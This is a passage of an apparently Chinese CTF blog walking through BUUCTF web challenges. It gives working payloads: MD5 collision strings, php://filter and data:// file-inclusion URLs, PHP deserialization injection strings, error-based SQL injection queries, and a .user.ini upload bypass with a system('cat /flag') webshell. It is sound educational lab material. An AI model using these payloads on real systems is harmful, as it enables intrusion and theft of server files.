class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>这样不可以用数组绕过，但可以采用MD5碰撞，也就是不同字符串但是MD5后值相同的情况</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$s2</span>))===<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$s3</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload读取<code>useless.php</code>文件内容</p><blockquote><p><strong>php:&#x2F;&#x2F;input</strong> ：&#x2F;?text&#x3D;php:&#x2F;&#x2F;input，然后使用bp进行post传递要读取的内容</p><p><strong>php:&#x2F;&#x2F;filter</strong> ：file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p><strong>data:&#x2F;&#x2F;</strong> ：?text&#x3D;data:text&#x2F;plain,welcome to the zjctf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>构造payload输入后查看源码即可获取flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?text=data:text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>空格和&#x3D;号没有，所以我们要使用（）来代替空格，使用like来代替&#x3D;号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#得到数据库geek</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23</span><br><span class="line">#得到数据表H4rDsq1</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#x27;geek&#x27;)))))%23</span><br><span class="line">#得到字段id,username,password</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;)))))%23</span><br><span class="line">#获取password字段内容</span><br><span class="line">#左半段</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</span><br><span class="line">#右半段</span><br><span class="line">/check.php?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23</span><br><span class="line">#两边拼接并且去掉重复内容即可得到flag</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>采用<code>.htaccess绕过</code>即可，参考本人博客<a href="https://www.evo1ution.cn/2022/05/27/upload-labs/">upload-labs</a>中<code>pass-04</code>即可上传成功。上传后用蚁剑连接，在根目录下即可找到flag。</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>传文件尝试发现报错有<code>exif_imagetype:not image!</code>，故需要修改文件头。</p><p>尝试后发现要使用<code>.user.ini</code>来绕过，文件内容为</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p></blockquote><p>尝试后发现还有报错<code>&lt;? in contents!</code>，故使用该一句话木🐎（注意文件名要与<code>.user.ini</code>中一致，此处为<code>1.jpg</code>）</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="title function_">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先上传<code>.user.ini</code>再上传<code>1.jpg</code>，最后访问图片所在上传目录的<code>index.php</code>文件即可得到flag。</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>打开网页发现源码及提示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p><img src="https://img.gejiba.com/images/428809e1acbf3710ab8f0c628ba88378.png" alt="428809e1acbf3710ab8f0c628ba88378.png"></p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>打开网页发现源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//文件包含，注意使用php://filter伪协议读取文件</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//弱比较</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>php7.1+的新特性，对属性类型不敏感，本地序列化的时候将protected属性改为public进行绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">//echo urlencode(serialize($a)).PHP_EOL;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>构造一个payload去执行read()函数，读取flag.php的内容。</p><blockquote><p>（1）op,filename,content三个变量权限都是<code>protected</code>，而protected权限的变量在序列化的时会有<code>%00*%00</code>字符，<code>%00</code>字符的ASCII码为0，就无法通过上面的<code>is_valid</code>函数校验。利用大写S采用的16进制，来绕过<code>is_valid</code>中对空字节的检查。使用 <code>//00 </code>替换 <code>%00</code> 。</p><p>（2）强比较和弱比较的利用。将op设置为int型的2，op &#x3D;&#x3D;&#x3D; “2”为false，op &#x3D;&#x3D; “2”为true,绕过析构函数中的if判断，同时又可以调用到读文件的流程。</p><p>参考：<a href="https://blog.csdn.net/weixin_52653109/article/details/124016115">Buuctf[网鼎杯 2020 青龙组]AreUSerialz</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\00&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://img.gejiba.com/images/a875cdabaadd2a490bcb0e2ec50279cb.png" alt="a875cdabaadd2a490bcb0e2ec50279cb.png"></p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" 